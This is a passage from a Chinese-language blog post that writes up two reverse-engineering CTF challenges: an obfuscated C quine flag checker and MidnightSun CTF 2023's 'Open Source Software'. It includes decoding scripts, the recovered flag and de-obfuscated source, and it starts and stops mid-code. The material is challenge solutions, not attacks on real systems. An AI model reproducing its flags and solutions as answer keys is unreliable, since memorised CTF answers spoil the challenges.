class="hljs-string">&quot;++=10;else/*haaa*/if(*Q|==126)*C++=32;else/*wtf_is_th&quot;</span><br><span class="hljs-string">&quot;is*/if(*Q==33)*C++=34;else|/*woeira*/if(*Q&gt;34)*C++=*Q&quot;</span><br><span class="hljs-string">&quot;;*D++=*Q==32?&#x27;\n&#x27;:*Q;&#125;for(int|u=-0;u&lt;l*4;)p(-b[1][u/4&quot;</span><br><span class="hljs-string">&quot;]+S[u++]-S[u++]+(S[u++]^S[u++])?|88:79);p(10);/*weird&quot;</span><br><span class="hljs-string">&quot;___*/for(int*d=B;d&lt;M+1280;)p(*d++);|printf(!%s)!,/*pr&quot;</span><br><span class="hljs-string">&quot;ogra*/H+304);return/*UwU*//*quine*/Q(/*random_stuf*/&quot;</span>)<br></code></pre></td></tr></table></figure><p>整完后就开始硬看了，但是这题当时有师傅已经做出来了，我对着解密脚本一点一点分析，发现自己的C语言也有好多不懂的地方，但还是大致把逻辑猜出来了</p><h2 id="字符串化运算符"><a href="#字符串化运算符" class="headerlink" title="字符串化运算符"></a>字符串化运算符</h2><p>一元运算符 # 常称为字符串化运算符（stringify operator 或 stringizing operator），因为它会把宏调用时的实参转换为字符串。# 的操作数必须是宏替换文本中的形参。当形参名称出现在替换文本中，并且具有前缀 # 字符时，预处理器会把与该形参对应的实参放到一对双引号中，形成一个字符串字面量。</p><h2 id="代码含义"><a href="#代码含义" class="headerlink" title="代码含义"></a>代码含义</h2><p><code>#define</code> 指令是用于创建预处理器宏的。它使用给定的名称 <code>Q</code> 来定义一个宏，该宏后面跟着一些代码。当代码中使用 <code>Q(arg)</code> 这个宏时，会自动被替换成 int<code>*P, u=0, M[99999],*C =M,*S=M+293; c *arg=#arg ,H[99999],*D=H; int(main)(int* a,c **b) &#123;arg;&#125;</code> 这段代码。</p><p>在这个宏展开后的代码中，<code>int(main)</code> 实际上是定义了一个函数，这是程序的入口点。函数使用了指针 <code>int* a</code> 和 <code>c </code><strong><code>b</code></strong> <strong>作为参数，其中</strong> <strong><code>int\* a</code></strong> <strong>代表一个指向整数类型的指针，</strong><strong><code>c </code></strong><code>b</code> 代表一个指向字符指针的指针。</p><p>在函数体中，宏 <code>Q</code> 中的 <code>arg</code> 会被替换成传递给 <code>Q</code> 宏的实际参数，在这里就是 <code>#q</code>，即宏定义时使用的字符串参数。</p><h2 id="主要逻辑"><a href="#主要逻辑" class="headerlink" title="主要逻辑"></a>主要逻辑</h2><p>因此逻辑部分就在这里，很明显b是main函数的参数，通过命令行传递的字符串参数，采用了-b与后面的S进行加减运算，这里的S可以在上面定义中发现是M+293，因此，S数组是从程序最后的字符串”^O{(u4X”开始的，如果等于0，那么就是O（X可以理解为错，O可以理解为对）因此只用编写解密脚本如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> <span class="hljs-type">const</span> *argv[])</span><br>&#123;<br>        <span class="hljs-type">char</span> s[] = <span class="hljs-string">&quot;^O&#123;(u4Xz&#125;e(tiIh.p+&#125;Kj&lt;&amp;eb]0@sHecW^[.xroBCW=N3nG+r.]rGEs.UJw^y&#x27;tn_Qv(y;Ed&#x27;)#@q@xI1N:wH&lt;X1aT)NtMvNlcY0;+x[cQ4j9&gt;Qi2#Yq&amp;fR#os=ELTjS^/deJZ;EuY`#IQwKL)w&lt;N&lt;Zh,;W9X=&amp;t0zX&amp;E0e&lt;_3SVaLs(pXk6z-XGHTx8T/?-^`h[K0h&#125;`dD6kX:vEeC,mI5fR9k]&#123;;yfO0Wg/1-Z^=WyUqN5XY1g25K1sJgKzfG.&quot;</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i&lt;<span class="hljs-built_in">strlen</span>(s)/<span class="hljs-number">4</span>;++i)&#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,(s[i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>] ^ s[i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>]) + s[i*<span class="hljs-number">4</span>] - s[i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>]);<br>        &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-comment">//bctf&#123;qu1n3_1s_4ll_ab0ut_r3p371t10n_4nD_m4n1pul4710n_OwO_OuO_UwU&#125;</span><br></code></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>分析过程基本上都是靠解密脚本边分析边猜的，现在发现看源代码也好痛苦）之后看到有师傅说编译后放IDA里做的，我当时是真滴没想到，分析过程是猜的，所以如果有错欢迎指正~</p><h1 id="MidnightSunCTFQuals2023-Open-Source-Software"><a href="#MidnightSunCTFQuals2023-Open-Source-Software" class="headerlink" title="MidnightSunCTFQuals2023-Open Source Software"></a>MidnightSunCTFQuals2023-Open Source Software</h1><p>第一次比赛中交题目，还是挺有意义的。我太菜了当时坐了差不多4个小时，从开始拿到代码手动整（信不过gpt）这次有经验就编译丢IDA里看了，主要把变量命名搞定就好了，然后扔IDA里看猜是用z3去解。然后就开始让gpt帮我把C代码转python，但没给我整出来，转用newbing。chatgpt？不行X，newbing行！差不多2-3h的时候z3脚本已经写完了，但改了一堆条件还无解，我就开始怀疑自我了。最后BMK师傅贴了个脚本好像也无解，我仔细对着看了下发现，我脚本里函数里if没加约束……之后改完就出来了</p><h2 id="源代码-1"><a href="#源代码-1" class="headerlink" title="源代码"></a>源代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> FLAG</span><br><span class="hljs-meta">#<span class="hljs-keyword">error</span> <span class="hljs-string">&quot;FLAG is not defined.&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Z3K(R2K) (((R2K)<span class="hljs-comment">/*&amp;||*/</span><span class="hljs-string">&lt;&lt;4)|((R2K)/*&amp;=|=*/&gt;</span>&gt;4))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> X1M(A9W,B8X) (((A9W)<span class="hljs-comment">/*|=*/</span>^(B8X))&amp;<span class="hljs-comment">/*~*/</span>0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> Y2G(A9W,B8X) ((A9W)<span class="hljs-comment">/*&gt;&gt;*/</span>&amp;0x55)|(((B8X)&amp;<span class="hljs-comment">/*&lt;&lt;*/</span>0xaa)&gt;&gt;1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> W4U(A9W,B8X) ((((A9W)<span class="hljs-comment">/*%*/</span>*(B8X))%<span class="hljs-comment">/*&amp;=|=*/</span>1257)&amp;0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> V5H(T3S) (((T3S)<span class="hljs-comment">/*&gt;&gt;*/</span><span class="hljs-string">&lt;&lt;1)|((T3S)/*|*/&gt;</span>&gt;7))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> S6E(T3S) (((T3S)<span class="hljs-comment">/*^*/</span><span class="hljs-string">&lt;&lt;3)^((T3S)/*&amp;*/&gt;</span>&gt;5))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D7F(A9W,B8X) (((A9W)<span class="hljs-comment">/*&lt;*/</span>&lt;&lt;4)^<span class="hljs-comment">/*~*/</span>(B8X))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> A1C(P6F,Q5G,R4H,S3I) Z3K(W4U(V5H(Z3K(Y2G(V5H(X1M(<span class="hljs-comment">/*&amp;||*/</span>P6F,Q5G)),V5H(X1M(R4H,S3I))))),Q5G)) <span class="hljs-comment">/* Function W */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> B2D(P6F,Q5G) V5H(Z3K(X1M(P6F,Q5G)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> C3E(P6F,Q5G) D7F(Q5G,Z3K(X1M(P6F,Q5G)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> D4F(P6F,Q5G) ((P6F)<span class="hljs-comment">/*&amp;|*/</span>^(Q5G))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> E1I(K2L,M1N) (W4U(V5H(Z3K(K2L)),q1s)<span class="hljs-comment">/*|*/</span>==(M1N)?(++q1s):(q1s=q1s))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> F2J(K2L,M1N) (V5H(Z3K(K2L))==(M1N)?(++r8w):(r8w=r8w))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> G3K(K2L,M1N) (S6E(K2L)==(M1N)?(++s9r):(s9r=s9r))</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> T6R;<br>T6R q1s=<span class="hljs-number">1</span>,r8w=<span class="hljs-number">1</span>,s9r=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> x0f[]=FLAG;T6R N = <span class="hljs-built_in">strlen</span>(x0f);<span class="hljs-comment">/* <span class="hljs-doctag">TODO:</span> REMOVE</span><br><span class="hljs-comment">    T6R h8m[]=&#123;A1C(x0f[19],x0f[15],x0f[11],x0f[4]),A1C(x0f[3],</span><br><span class="hljs-comment">    x0f[20],x0f[10],x0f[14]),A1C(x0f[0],x0f[6],x0f[1],x0f[8]),</span><br><span class="hljs-comment">    A1C(x0f[17],x0f[13],x0f[9],x0f[23]),&#125;;T6R g7k[]=&#123;D4F(C3E(x0f[4],</span><br><span class="hljs-comment">    x0f[23]),C3E(x0f[11],x0f[18])),D4F(C3E(x0f[17],x0f[10]),C3E(x0f[12],</span><br><span class="hljs-comment">    x0f[7])),D4F(C3E(x0f[15],x0f[6]),C3E(x0f[20],x0f[1])),D4F(C3E(x0f[22],</span><br><span class="hljs-comment">    x0f[14]),C3E(x0f[5],x0f[3])),D4F(C3E(x0f[9],x0f[0]),C3E(x0f[13],</span><br><span class="hljs-comment">    x0f[16])),D4F(C3E(x0f[8],x0f[19]),C3E(x0f[5],x0f[21])),&#125;;*/</span><br>    T6R p5f[<span class="hljs-number">12</span>]=&#123;<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">010</span>,<span class="hljs-number">20</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">014</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">02</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">012</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>&#125;;T6R g7k[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    T6R h8m[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;;T6R j9n[<span class="hljs-number">12</span>]=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">for</span>(T6R a2z=<span class="hljs-number">0</span>;a2z&lt;N;a2z+=<span class="hljs-number">4</span>)&#123;<br>    <span class="hljs-keyword">if</span>(a2z&lt;<span class="hljs-number">12</span>)&#123;j9n[p5f[a2z+<span class="hljs-number">3</span>]/<span class="hljs-number">2</span>]=B2D(x0f[p5f[a2z+<span class="hljs-number">3</span>]],x0f[p5f[a2z+<span class="hljs-number">3</span>]+<span class="hljs-number">1</span>]);<br>    g7k[a2z/<span class="hljs-number">4</span>]=D4F(C3E(x0f[a2z*<span class="hljs-number">2</span>],x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>]),C3E(x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>],x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">6</span>]));<br>    <span class="hljs-keyword">if</span>(a2z&lt;<span class="hljs-number">4</span>)h8m[a2z/<span class="hljs-number">4</span>]=A1C(x0f[a2z],x0f[a2z+<span class="hljs-number">4</span>],x0f[a2z+<span class="hljs-number">8</span>],x0f[a2z+<span class="hljs-number">12</span>]);<br>    g7k[(a2z/<span class="hljs-number">4</span>)+<span class="hljs-number">3</span>]= D4F(C3E(x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>],x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">3</span>]),C3E(x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">5</span>],x0f[a2z*<span class="hljs-number">2</span>+<span class="hljs-number">7</span>]));<br>    j9n[p5f[a2z+<span class="hljs-number">1</span>]/<span class="hljs-number">2</span>]=B2D(x0f[p5f[a2z+<span class="hljs-number">1</span>]],x0f[p5f[a2z+<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>]);<br>    j9n[p5f[a2z+<span class="hljs-number">2</span>]/<span class="hljs-number">2</span>]=B2D(x0f[p5f[a2z+<span class="hljs-number">2</span>]],x0f[p5f[a2z+<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">if</span>(a2z==<span class="hljs-number">4</span>)h8m[<span class="hljs-number">1</span>]=A1C(x0f[<span class="hljs-number">16</span>],x0f[<span class="hljs-number">20</span>],x0f[<span class="hljs-number">1</span>],x0f[<span class="hljs-number">5</span>]);<br>    j9n[p5f[a2z]/<span class="hljs-number">2</span>]=B2D(x0f[p5f[a2z]],x0f[p5f[a2z]+<span class="hljs-number">1</span>]);&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">if</span>(a2z&lt;<span class="hljs-number">16</span>)&#123;h8m[a2z/<span class="hljs-number">6</span>]=A1C(x0f[a2z<span class="hljs-number">-3</span>],x0f[a2z+<span class="hljs-number">1</span>],x0f[a2z+<span class="hljs-number">5</span>],x0f[a2z*<span class="hljs-number">2</span><span class="hljs-number">-3</span>]);<br>    h8m[<span class="hljs-number">3</span>]=A1C(x0f[<span class="hljs-number">2</span>],x0f[<span class="hljs-number">6</span>],x0f[<span class="hljs-number">10</span>],x0f[<span class="hljs-number">14</span>]);&#125; <br>    G3K(g7k[<span class="hljs-number">0</span>],<span class="hljs-number">0x202</span>);G3K(g7k[<span class="hljs-number">1</span>],<span class="hljs-number">0x1aa2</span>);G3K(g7k[<span class="hljs-number">2</span>],<span class="hljs-number">0x5a5</span>);&#125;&#125;<br>    h8m[<span class="hljs-number">4</span>]=A1C(x0f[s9r*<span class="hljs-number">2</span>-q1s-r8w],x0f[s9r*<span class="hljs-number">2</span>+q1s+r8w],x0f[q1s*<span class="hljs-number">3</span>],x0f[r8w*<span class="hljs-number">7</span>]);<br>    h8m[<span class="hljs-number">5</span>]=A1C(x0f[s9r+q1s],x0f[s9r+<span class="hljs-number">5</span>],x0f[s9r*<span class="hljs-number">2</span>-r8w],x0f[s9r*<span class="hljs-number">2</span>+<span class="hljs-number">3</span>]);<br>    E1I(h8m[<span class="hljs-number">0</span>],<span class="hljs-number">0x5B</span>);E1I(h8m[<span class="hljs-number">1</span>],<span class="hljs-number">13</span>);E1I(h8m[<span class="hljs-number">2</span>],<span class="hljs-number">0x5D</span>);<br>    E1I(h8m[<span class="hljs-number">3</span>],<span class="hljs-number">0244</span>);E1I(h8m[<span class="hljs-number">4</span>],<span class="hljs-number">52</span>);E1I(h8m[<span class="hljs-number">5</span>],<span class="hljs-number">0xDC</span>);<br>    F2J(j9n[<span class="hljs-number">0</span>],<span class="hljs-number">0x1010</span>);F2J(j9n[<span class="hljs-number">1</span>],<span class="hljs-number">024050</span>);F2J(j9n[<span class="hljs-number">2</span>],<span class="hljs-number">034070</span>);<br>    F2J(j9n[<span class="hljs-number">3</span>],<span class="hljs-number">28784</span>);F2J(j9n[<span class="hljs-number">4</span>],<span class="hljs-number">0x12d2d</span>);F2J(j9n[<span class="hljs-number">5</span>],<span class="hljs-number">0x10d0d</span>);<br>    F2J(j9n[<span class="hljs-number">6</span>],<span class="hljs-number">042104</span>);F2J(j9n[<span class="hljs-number">7</span>],<span class="hljs-number">012024</span>);F2J(j9n[<span class="hljs-number">8</span>],<span class="hljs-number">0xc4c4</span>);<br>    F2J(j9n[<span class="hljs-number">9</span>],<span class="hljs-number">0156334</span>);F2J(j9n[<span class="hljs-number">10</span>],<span class="hljs-number">0x16161</span>);F2J(j9n[<span class="hljs-number">11</span>],<span class="hljs-number">0270561</span>);<br>    F2J(B2D(x0f[<span class="hljs-number">20</span>],x0f[<span class="hljs-number">23</span>]),<span class="hljs-number">4112</span>);F2J(B2D(x0f[<span class="hljs-number">14</span>],x0f[<span class="hljs-number">0</span>]),<span class="hljs-number">90465</span>);<br>    G3K(g7k[<span class="hljs-number">3</span>],<span class="hljs-number">03417</span>);G3K(g7k[<span class="hljs-number">4</span>],<span class="hljs-number">0x3787</span>);G3K(g7k[<span class="hljs-number">5</span>],<span class="hljs-number">030421</span>);<br>    T6R s1d = <span class="hljs-number">0</span>;<span class="hljs-keyword">for</span> (T6R a2z=<span class="hljs-number">0</span>;a2z&lt;N;a2z++)s1d=(s1d*<span class="hljs-number">251</span>)^x0f[a2z];<br>    <span class="hljs-built_in">printf</span>((q1s==<span class="hljs-number">7</span>)&amp;&amp;(r8w==<span class="hljs-number">15</span>)&amp;&amp;(s9r==<span class="hljs-number">13</span>)&amp;&amp;(s1d==<span class="hljs-number">0x4E6F76D0</span>)?<span class="hljs-string">&quot;:)\n&quot;</span>:<span class="hljs-string">&quot;:(\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="整理后的代码"><a href="#整理后的代码" class="headerlink" title="整理后的代码"></a>整理后的代码</h2><p>我自己整的代码没保存，这是其他师傅整好的源代码，个人感觉编译后放IDA里分析比看源代码舒服</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FLAG <span class="hljs-string">&quot;flag&#123;this_is_test_flag&#125;&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> FLAG</span><br><span class="hljs-meta">#<span class="hljs-keyword">error</span> <span class="hljs-string">&quot;FLAG is not defined.&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_1(x) (((x)<span class="hljs-string">&lt;&lt;4)|((x)&gt;</span>&gt;4))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_2(x,y) (((x)^(y))&amp;0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_3(x,y) ((x)&amp;0x55)|(((y)&amp;0xaa)&gt;&gt;1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_4(x,y) ((((x)*(y))%1257)&amp;0xff)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_5(x) (((x)<span class="hljs-string">&lt;&lt;1)|((x)&gt;</span>&gt;7))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_6(x) (((x)<span class="hljs-string">&lt;&lt;3)^((x)&gt;</span>&gt;5))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> calc_7(x,y) (((x)&lt;&lt;4)^(y))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fun_1(a,b,c,d) calc_1(calc_4(calc_5(calc_1(calc_3(calc_5(calc_2(a,b)),calc_5(calc_2(c,d))))),b))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fun_2(a,b) calc_5(calc_1(calc_2(a,b)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fun_3(a,b) calc_7(b,calc_1(calc_2(a,b)))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> fun_4(a,b) ((a)^(b))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> check_a(a,b) (calc_4(calc_5(calc_1(a)),q1s)==(b)?(++q1s):(q1s=q1s))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> check_b(a,b) (calc_5(calc_1(a))==(b)?(++r8w):(r8w=r8w))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> check_c(a,b) (calc_6(a)==(b)?(++s9r):(s9r=s9r))</span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> q1s=<span class="hljs-number">1</span>,r8w=<span class="hljs-number">1</span>,s9r=<span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span> flag[]=FLAG;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> N = <span class="hljs-built_in">strlen</span>(flag);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> index_arr[<span class="hljs-number">12</span>]=&#123;<span class="hljs-number">0x10</span>,<span class="hljs-number">0</span>,<span class="hljs-number">010</span>,<span class="hljs-number">20</span>,<span class="hljs-number">0xe</span>,<span class="hljs-number">014</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">02</span>,<span class="hljs-number">0x16</span>,<span class="hljs-number">012</span>,<span class="hljs-number">6</span>,<span class="hljs-number">4</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> data_1[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> data_2[<span class="hljs-number">6</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> data_3[<span class="hljs-number">12</span>]=&#123;<span class="hljs-number">0</span>&#125;;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i+=<span class="hljs-number">4</span>)&#123;<br><span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">12</span>)&#123;<br>data_3[index_arr[i+<span class="hljs-number">3</span>]/<span class="hljs-number">2</span>]=fun_2(flag[index_arr[i+<span class="hljs-number">3</span>]],flag[index_arr[i+<span class="hljs-number">3</span>]+<span class="hljs-number">1</span>]);<br>data_1[i/<span class="hljs-number">4</span>]=fun_4(fun_3(flag[i*<span class="hljs-number">2</span>],flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">2</span>]),fun_3(flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">4</span>],flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">6</span>]));<br><span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">4</span>)<br>data_2[i/<span class="hljs-number">4</span>]=fun_1(flag[i],flag[i+<span class="hljs-number">4</span>],flag[i+<span class="hljs-number">8</span>],flag[i+<span class="hljs-number">12</span>]);<br>data_1[(i/<span class="hljs-number">4</span>)+<span class="hljs-number">3</span>]= fun_4(fun_3(flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>],flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">3</span>]),fun_3(flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">5</span>],flag[i*<span class="hljs-number">2</span>+<span class="hljs-number">7</span>]));<br>data_3[index_arr[i+<span class="hljs-number">1</span>]/<span class="hljs-number">2</span>]=fun_2(flag[index_arr[i+<span class="hljs-number">1</span>]],flag[index_arr[i+<span class="hljs-number">1</span>]+<span class="hljs-number">1</span>]);<br>data_3[index_arr[i+<span class="hljs-number">2</span>]/<span class="hljs-number">2</span>]=fun_2(flag[index_arr[i+<span class="hljs-number">2</span>]],flag[index_arr[i+<span class="hljs-number">2</span>]+<span class="hljs-number">1</span>]);<br><span class="hljs-keyword">if</span>(i==<span class="hljs-number">4</span>)<br>data_2[<span class="hljs-number">1</span>]=fun_1(flag[<span class="hljs-number">16</span>],flag[<span class="hljs-number">20</span>],flag[<span class="hljs-number">1</span>],flag[<span class="hljs-number">5</span>]);<br>data_3[index_arr[i]/<span class="hljs-number">2</span>]=fun_2(flag[index_arr[i]],flag[index_arr[i]+<span class="hljs-number">1</span>]);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">if</span>(i&lt;<span class="hljs-number">16</span>)&#123;<br>data_2[i/<span class="hljs-number">6</span>]=fun_1(flag[i<span class="hljs-number">-3</span>],flag[i+<span class="hljs-number">1</span>],flag[i+<span class="hljs-number">5</span>],flag[i*<span class="hljs-number">2</span><span class="hljs-number">-3</span>]);<br>data_2[<span class="hljs-number">3</span>]=fun_1(flag[<span class="hljs-number">2</span>],flag[<span class="hljs-number">6</span>],flag[<span class="hljs-number">10</span>],flag[<span class="hljs-number">14</span>]);<br>&#125; <br>check_c(data_1[<span class="hljs-number">0</span>],<span class="hljs-number">0x202</span>);<br>check_c(data_1[<span class="hljs-number">1</span>],<span class="hljs-number">0x1aa2</span>);<br>check_c(data_1[<span class="hljs-number">2</span>],<span class="hljs-number">0x5a5</span>);<br>&#125;<br>&#125;<br><br>    data_2[<span class="hljs-number">4</span>]=fun_1(flag[s9r*<span class="hljs-number">2</span>-q1s-r8w],flag[s9r*<span class="hljs-number">2</span>+q1s+r8w],flag[q1s*<span class="hljs-number">3</span>],flag[r8w*<span 